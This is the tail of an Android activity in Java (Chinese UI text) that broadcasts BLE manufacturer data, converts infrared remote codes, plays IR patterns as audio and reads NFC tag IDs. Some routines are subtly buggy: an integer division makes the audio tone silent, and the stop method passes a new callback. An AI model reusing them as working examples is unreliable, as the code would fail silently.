						} else {
							Toast.makeText(getApplication(), "无权限，请授权后重试!", Toast.LENGTH_SHORT).show();
						}
					} else {
						Toast.makeText(this, "您的设备不支持BLE广播！错误代码：03", Toast.LENGTH_SHORT).show();
					}
				} else {
					Toast.makeText(this, "您的设备不支持蓝牙或没有蓝牙权限！错误代码：04", Toast.LENGTH_SHORT).show();
				}
				break;
			default:
				break;
		}
	}

	//停止广播
    @SuppressLint("MissingPermission")
    public void stopAdv() {
        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
            @Override
            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
					  + status);
                currentAdvertisingSet = advertisingSet;
            }

            @Override
            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
            }

            @Override
            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
            }

            @Override
            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
                Log.i("BLE", "onAdvertisingSetStopped():");
            }
        };
        if (bluePermission()) {
            bluetoothLeAdvertiser.stopAdvertisingSet(advertisingCallback);
        }
    }

    //开始广播
    @SuppressLint("MissingPermission")
    public void startAdv(int tag,byte[] data) {
        AdvertisingSetParameters parameters = new AdvertisingSetParameters.Builder()
			.setLegacyMode(true)
			.setConnectable(false)
			.setInterval(interval)
			.setTxPowerLevel(txPowerLevel)
			.build();
        AdvertiseData Data = new AdvertiseData.Builder()
			.setIncludeDeviceName(false)
			.setIncludeTxPowerLevel(false)
			.addManufacturerData(tag, data)
			.build();
        AdvertiseData scanData = new AdvertiseData.Builder()
			.setIncludeTxPowerLevel(true)
			.setIncludeDeviceName(true)
			.build();
        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
            @Override
            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
					  + status);
                currentAdvertisingSet = advertisingSet;
            }

            @Override
            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
            }

            @Override
            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
            }

            @Override
            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
                Log.i("BLE", "onAdvertisingSetStopped():");
            }
        };
        if (bluePermission()) {
            Log.d("BLE", "Advertising Successful!");
            bluetoothLeAdvertiser.startAdvertisingSet(parameters, Data, scanData, null, null, advertisingCallback);
        } else {
            Log.e("BLE", "Advertising Failed! Need Permission.");
            Toast.makeText(this, "程序需要获取权限！错误代码：02", Toast.LENGTH_SHORT).show();
        }
    }

	@SuppressLint("MissingPermission")
    public void startAdv(AdvertiseData data) {
        AdvertisingSetParameters parameters = new AdvertisingSetParameters.Builder()
			.setLegacyMode(true)
			.setConnectable(false)
			.setInterval(interval)
			.setTxPowerLevel(txPowerLevel)
			.build();
        AdvertiseData scanData = new AdvertiseData.Builder()
			.setIncludeTxPowerLevel(true)
			.setIncludeDeviceName(true)
			.build();
        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
            @Override
            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
					  + status);
                currentAdvertisingSet = advertisingSet;
            }

            @Override
            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
            }

            @Override
            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
            }

            @Override
            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
                Log.i("BLE", "onAdvertisingSetStopped():");
            }
        };
        if (bluePermission()) {
            Log.d("BLE", "Advertising Successful!");
            bluetoothLeAdvertiser.startAdvertisingSet(parameters, data, scanData, null, null, advertisingCallback);
        } else {
            Log.e("BLE", "Advertising Failed! Need Permission.");
            Toast.makeText(this, "程序需要获取权限！错误代码：02", Toast.LENGTH_SHORT).show();
        }
    }

	public boolean checkCIR(ConsumerIrManager cir) {
		return Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && cir.hasIrEmitter();
	}

	public boolean isSupportedFrequency(ConsumerIrManager irService, int targetFreq) {
        for (ConsumerIrManager.CarrierFrequencyRange it : irService.getCarrierFrequencies()) {
            if (it.getMinFrequency() <= targetFreq && targetFreq <= it.getMaxFrequency()) {
                return true;
            }
        }
        return false;
	}

	public String hex2dec(String irData) {
		List<String> list = new ArrayList<String>(Arrays.asList(irData.split(" ")));
		list.remove(0); 
		int frequency = Integer.parseInt(list.remove(0), 16); 
		list.remove(0); 
		list.remove(0); 


		for (int i = 0; i < list.size(); i++) {
			list.set(i, Integer.toString(Integer.parseInt(list.get(i), 16)));
		}


		frequency = (int) (1000000 / (frequency * 0.241246));
		list.add(0, Integer.toString(frequency));


		irData = "";
		for (String s : list) {
			irData += s + ",";
		}
		return irData;
	}

	public String count2duration(String countPattern) {
		List<String> list = new ArrayList<String>(Arrays.asList(countPattern.split(",")));
        int frequency = Integer.parseInt(list.get(0));
        int pulses = 1000000 / frequency;
        int count;
        int duration;
		for (int i = 1; i < list.size(); i++) {
            count = Integer.parseInt(list.get(i));
			duration = count * pulses;
			list.set(i, Integer.toString(duration));
		}

		String durationPattern = "";
        for (String s : list) {
			durationPattern += s + ",";
		}
		return durationPattern;
	}

	public void infrared2audio(int freqOfTone, int[] patterns) {
		// 设置采样率等参数
		int sampleRate = 44100;
		int buffSize = AudioTrack.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_OUT_STEREO, AudioFormat.ENCODING_PCM_16BIT) * 4;
		AudioTrack audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC, sampleRate, AudioFormat.CHANNEL_OUT_STEREO, AudioFormat.ENCODING_PCM_16BIT, buffSize, AudioTrack.MODE_STREAM);

        // 生成PCM音频数
		int numSamples = sampleRate; // 1秒钟的采样点数
		double[] sample = new double[numSamples];
		byte[] generatedSnd = new byte[numSamples * 4]; // 每个采样点占4个字节（16位双声道）

		for (int i = 0; i < numSamples; ++i) {
			sample[i] = Math.sin(2 * Math.PI * i * (freqOfTone / sampleRate));
		}

		int idx = 0;
		for (final double dVal : sample) {
			final short val = (short) (dVal * 32767);
			final short val_minus = (short) -val;

			generatedSnd[idx++] = (byte) (val & 0x00ff);
			generatedSnd[idx++] = (byte) ((val & 0xff00) >>> 8);
			generatedSnd[idx++] = (byte) (val_minus & 0x00ff);
			generatedSnd[idx++] = (byte) ((val_minus & 0xff00) >>> 8);
		}

        // 发送PCM数据
		List<Byte> listByte = new ArrayList<>();

		for (int j = 0; j < patterns.length; j++) {
			int d = patterns[j];
			final int points = (int) ((((double) d / 1000000.0) * sampleRate) * 4);

			if (j % 2 == 0) {
				for (int i = 0; i < points; i++) {
					listByte.add(generatedSnd[i]);
				}
			} else {
				for (int i = 0; i < points; i++) {
					listByte.add((byte) 0);
				}
			}
		}

        // 播放PCM数据
		try {
			audioTrack.play();
		} catch (IllegalStateException e) {
			Log.e("AudioTrack", e.getMessage());
		}

        // 将List<Byte>转换为byte[]
		byte[] byteArray = new byte[listByte.size()];
		for (int i = 0; i < listByte.size(); i++) {
			byteArray[i] = listByte.get(i);
		}

		audioTrack.write(byteArray, 0, byteArray.length);
	}

    @Override
    protected void onPause() {
        super.onPause();
        nfcUtils.onPauseNfcAdapter(this);       //activity切换到后台的时候停止扫描
    }

    @Override
    public void doing(Tag tag) {
		Toast.makeText(getApplication(), "读取到一个NFC数据", Toast.LENGTH_SHORT).show();
        NFCtext.setText("NFC读取到的数据:" + nfcUtils.ByteArrayToHexString(tag.getId()));   //扫到卡片的时候做的事情。
    }

	//获取蓝牙权限
    private boolean bluePermission() {
        Log.i("BLE", "Requesting Bluetooth Permission...");
        if (android.os.Build.VERSION.SDK_INT > 30) {
            if (ContextCompat.checkSelfPermission(this,
												  "android.permission.BLUETOOTH_ADVERTISE")
				!= PERMISSION_GRANTED
				|| ContextCompat.checkSelfPermission(this,
													 "android.permission.BLUETOOTH_CONNECT")
				!= PERMISSION_GRANTED
				) {
                ActivityCompat.requestPermissions(this, new String[]{
													  "android.permission.BLUETOOTH_ADVERTISE",
													  "android.permission.BLUETOOTH_CONNECT",}, 1);
                return false;
            }
        } else {
            if (ContextCompat.checkSelfPermission(this,
												  "android.permission.ACCESS_FINE_LOCATION")
				!= PERMISSION_GRANTED
				) {
                ActivityCompat.requestPermissions(this, new String[]{
													  "android.permission.ACCESS_FINE_LOCATION",
												  }, 1);
                return false;
            }
        }
        return true;
    }

    //权限获取结果反馈
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            if (grantResults[0] != PERMISSION_GRANTED) {
                if (android.os.Build.VERSION.SDK_INT > 30) {
                    if (ContextCompat.checkSelfPermission(this, "android.permission.BLUETOOTH_ADVERTISE") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：BLUETOOTH_ADVERTISE", Toast.LENGTH_SHORT).show();
                    }
                    if (ContextCompat.checkSelfPermission(this, "android.permission.BLUETOOTH_CONNECT") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：BLUETOOTH_CONNECT", Toast.LENGTH_SHORT).show();
                    }
                } else {
                    if (ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_FINE_LOCATION") != PERMISSION_GRANTED) {
                        Toast.makeText(this, "无权限：android.permission.ACCESS_FINE_LOCATION", Toast.LENGTH_SHORT).show();
                    }
                }
            }
        }
    }
}
